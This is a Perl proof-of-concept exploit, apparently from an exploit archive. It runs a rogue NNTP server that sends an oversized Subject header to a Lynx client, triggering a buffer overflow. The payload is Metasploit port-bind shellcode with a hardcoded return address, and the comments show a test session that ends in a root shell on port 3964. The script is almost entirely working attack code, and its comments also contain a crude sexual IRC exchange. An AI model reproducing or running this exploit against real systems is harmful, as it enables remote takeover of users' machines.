#!/usr/bin/perl --

# lynx-nntp-server
# by Ulf Harnhammar in 2005
# I hereby place this program in the public domain.

#*********************************************************************************
#*********************************************************************************
#
# edited by xwings in 1st Nov 2005 , xwings at xwings.net
#
# For all my friends in #mantis @ ptp
#
# 14:21 < mark> xwings
# 14:21 < mark> wanna fuck
# 14:21 < xwings> mark: sure
# 14:21 < mark> sweet
# 14:21  * mark gets his lingerie
#
# Why lynx ? I guess ... I am bored  ... :p
#
# Metasploit Port Bind Shellcode , Port : 3964
#
# Downloaded lynx from : 
# ftp://lynx.isc.org/lynx-2.8.3/lynx2-8-3.tar.gz
#
# Configure , make , make install under Kubuntu 5.10 (Breezy).
# gcc version 4.0.2 20050808 (prerelease) (Ubuntu 4.0.1-4ubuntu9)
# Linux note 2.6.12-9-386 #1 Mon Oct 10 13:14:36 BST 2005 i686 GNU/Linux
#
# (01:24:12).xwings@note.<lynx-htmime>$ /home/xwings/usr/bin/lynx -version
#
# Lynx Version 2.8.3rel.1 (23 Apr 2000)
# Built on linux-gnu Oct 22 2005 23:44:16
#
# Copyrights held by the University of Kansas, CERN, and other contributors.
# Distributed under the GNU General Public License.
# See http://lynx.browser.org/ and the online help for more information.
#
# *** [ Screen 1 ] ***
# (01:21:30).xwings@note.<lynx-htmime>$ sudo perl lynx-nntp-server.pl 
#  connection from 127.0.0.1
# SENT:  200 Internet News
# RECEIVED:  mode reader
# SENT:  200 Internet News
# RECEIVED:  GROUP my.server
# SENT:  211 1 1 1 my.server
# RECEIVED:  HEAD 1
# SENT:  221 1 <xyzzy@usenet.qx>
# Path: host!someotherhost!onemorehost
# From: <mr_talkative@usenet.qx>
# Subject: $@UU(JUU$@UU(JUU$@UU(JUU$@UU(JUU$@UU(JUU$@UU(JUU$@UU
# (JUU$@UU(JUU$@UU(JUU$@UU(JUU$@UU(JUU$@UU(JUU$@UU(JUU$@UU(JUU$@UU
# (JUUFFFFFF1É.ï¿½ï¿½ï¿½$ï¿½sï¿½ï¿½ï¿½ï¿½cBï¿½k     Cï¿½iï¿½VRaoZgï¿½WaoXï¿½ï¿½bSÍ¹ï¿½ï¿½{ï¿½XXï¿½ï¿½X.ï¿½Xi
# ï¿½YoambRaoEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
# EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
# EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
# EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
# AAAAAAAAAABBBBBBBBBBCCCCCCCCï¿½
# Newsgroup: my.server
# Message-ID: <xyzzy@usenet.qx>
# .
# TIMED OUT
# RECEIVED:
# closed
# 
# *** [ Screen 2 ] ***
# (01:21:39).xwings@note.<bin>$ sudo ./lynx nntp://localhost/my.server
#  
# *** [ Screen 3 ] ***
# (11:53:41).xwings@note.<~>$ nc localhost 3964
# id
# uid=0(root) gid=0(root) groups=0(root)
#
#*********************************************************************
#*********************************************************************

use strict;
use IO::Socket;

$main::port = 119;
$main::timeout = 5;


# *** SUBROUTINES ***


sub mysend($$)
{
  my $file = shift;
  my $str = shift;

  print $file "$str\n";
  print "SENT:  $str\n";
} # sub mysend


sub myreceive($)
{
  my $file = shift;
  my $inp;

  eval
  {
    local $SIG{ALRM} = sub { die "alarm\n" };
    alarm $main::timeout;
    $inp = <$file>;
    alarm 0;
  };

  if ($@ eq "alarm\n") { $inp = ''; print "TIMED OUT\n"; }
  $inp =~ tr/\015\012\000//d;
  print "RECEIVED:  $inp\n";
  $inp;
} # sub myreceive


# *** MAIN PROGRAM ***


{
  my $server = IO::Socket::INET->new( Proto     => 'tcp',
                                      LocalPort => $main::port,
                                      Listen    => SOMAXCONN,
                                      Reuse     => 1);
  die "can't set up server!\n" unless $server;


  while (my $client = $server->accept())
  {
    $client->autoflush(1);
    print 'connection from '.$client->peerhost."\n";


    mysend($client, '200 Internet News');
    my $group = 'alt.angst';

    while (my $str = myreceive($client))
    {
      if ($str =~ m/^mode reader$/i)
      {
        mysend($client, '200 Internet News');
        next;
      }

      if ($str =~ m/^group ([-_.a-zA-Z0-9]+)$/i)
      {
        $group = $1;
        mysend($client, "211 1 1 1 $group");
        next;
      }

      if ($str =~ m/^quit$/i)
      {
        mysend($client, '205 Goodbye');
        last;
      }

      if ($str =~ m/^head ([0-9]+)$/i)
      {
        my $evil = '$@UU(JUU' x 15; # Edit the number!
        #$evil .= 'A' x (504 - length $evil); <-- I don't need this .. 
        
        ## Added by xwings
        
        $evil .= 'F' x 6; # Where is my shell ?
        $evil .= "\x31\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe8".
                 "\x8e\x30\x01\x83\xeb\xfc\xe2\xf4\xd9\x55\x63\x42\xbb\xe4\x32\x6b".
                 "\x8e\xd6\xa9\x88\x09\x43\xb0\x97\xab\xdc\x56\x69\xe7\xf2\x56\x52".
                 "\x61\x6f\x5a\x67\xb0\xde\x61\x57\x61\x6f\xfd\x81\x58\xe8\xe1\xe2".
                 "\x25\x0e\x62\x53\xbe\xcd\xb9\xe0\x58\xe8\xfd\x81\x7b\xe4\x32\x58".
                 "\x58\xb1\xfd\x81\xa1\xf7\xc9\xb1\xe3\xdc\x58\x2e\xc7\xfd\x58\x69".
                 "\xc7\xec\x59\x6f\x61\x6d\x62\x52\x61\x6f\xfd\x81";
        $evil .= 'E' x 236; # Initial Marker
        $evil .= 'A' x 10;  # Move Abit Further
        $evil .= 'B' x 10;  # Oh .. Abit more
        $evil .= 'C' x 8;   # Nearer ... 
        $evil .= "\x9c\xdf\xff\xbf"; #RET 0xbfffdf9c

        ## End of Add , xwings

        my $head = <<HERE;
221 $1 <xyzzy\@usenet.qx>
Path: host!someotherhost!onemorehost
From: <mr_talkative\@usenet.qx>
Subject: $evil
Newsgroup: $group
Message-ID: <xyzzy\@usenet.qx>
.
HERE

        $head =~ s|\s+$||s;
        mysend($client, $head);
        next;
      }

      mysend($client, '500 Syntax Error');
    } # while str=myreceive(client)

    close $client;
    print "closed\n\n\n";
  } # while client=server->accept()
}

# milw0rm.com [2005-11-02]
